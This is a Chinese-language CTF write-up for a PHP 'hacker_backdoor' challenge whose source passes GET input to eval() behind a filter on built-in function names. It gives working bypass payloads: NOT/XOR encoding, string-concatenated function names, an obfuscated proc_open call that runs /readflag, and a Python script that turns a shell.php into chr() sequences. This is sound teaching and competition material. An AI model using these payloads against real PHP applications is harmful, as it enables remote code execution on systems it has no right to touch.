# hacker_backdoor
## 所用知识点：
### 1.正则绕过
### 2.rce函数的替换

源码审计：
```
<?php
error_reporting(0);
if(!isset($_GET['code']) || !isset($_GET['useful'])){
    highlight_file(__file__);
}
$code = $_GET['code'];
$usrful = $_GET['useful'];

//内置函数返回false
function waf($a){
    $dangerous = get_defined_functions();
    array_push($dangerous["internal"], 'eval', 'assert');
    foreach ($dangerous["internal"] as $bad) {
        if(strpos($a,$bad) !== FALSE){
            return False;
            break;
        }
    }
    return True;
}

//文件是否存在
if(file_exists($usrful)){
    if(waf($code)){
//        $code='phpinfo();';
        @eval($code);
    }
    else{
        die("oh,不能输入这些函数哦 :) ");
    }
}

```

发现只要，使用内置函数，就返回false，无法执行代码

### 1.这里一开始想到取反，异或绕过

取反：`?code=(~%8F%97%8F%96%91%99%90)();&useful=index.php`

异或:`?code=(%8F%97%8F%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();&useful=index.php`

在本地测试成功，去到靶机却无法执行，一开始纳闷了好久...原来是因为靶机版本为5.6.4,php7之前不支持($a)();所以无法执行...

p神的文章也有提到：
https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

### 2.然后一位队友的，骚操作是采用代码拼接的方式

payload:`?code=$a='php'.'info';$a();&useful=index.php`

将需要执行的韩式，采用拼接的方式绕过，监测，一开始还真没想到...

这个时候也可以大胆猜测一下eval函数的功能：将字符串以代码的形式，添加到源代码中执行。不得不说这个函数真强大

### 3.得到phpinfo界面查看禁用函数

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/南邮ctf2019/images/34FBDCE7626146C8AC342250C2727D73hacker_backdoor1.png)

rce函数基本都被禁用了，但是发现proc_open还可以用

### 4.构造payload:

proc_open()函数，命令执行方法
```
<?php
$test = "whoami";
$array = array(
    array("pipe", "r"),   //标准输入
    array("pipe", "w"),   //标准输出内容
    array("pipe", "w")    //标准输出错误
);

$fp = proc_open($test, $array, $pipes);   //打开一个进程通道
echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容
proc_close($fp);
```

bypass处理：

```
<?php
$b="p";
$c="ipe";
$test="/readflag";
$g='c'.'h'.'r';
$h=$g(95);
$a=[[$b.$c,"r"], [$b.$c,"w"], [$b.$c,"w"] ];
$aa='p'.'r'.'o'.'c'.$h.'o'.'p'.'e'.'n';
$fp=$aa($test,$a,$p);
$d='stre'.'am'.$h.'ge'.'t'.$h.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
echo $d($p[1]);
?>
```

方法二：

利用chr

```
?code=?%3E%3C?php%20Echo%20Eval(cHr(0x70).cHr(0x68).cHr(0x70).cHr(0x69).cHr(0x6e).cHr(0x66).cHr(0x6f).cHr(0x28).cHr(0x29).cHr(0x3b))?%3E
```

exp:

```
str1 = ""
with open("shell.php", "r") as f:
    # 逐行读取
    code = f.read()
    # print(code)
    for i in code:
        if ord(i)== 10:
            continue
        str1 += ("cHr("+str(hex(ord(i)))+").")
print(str1)

```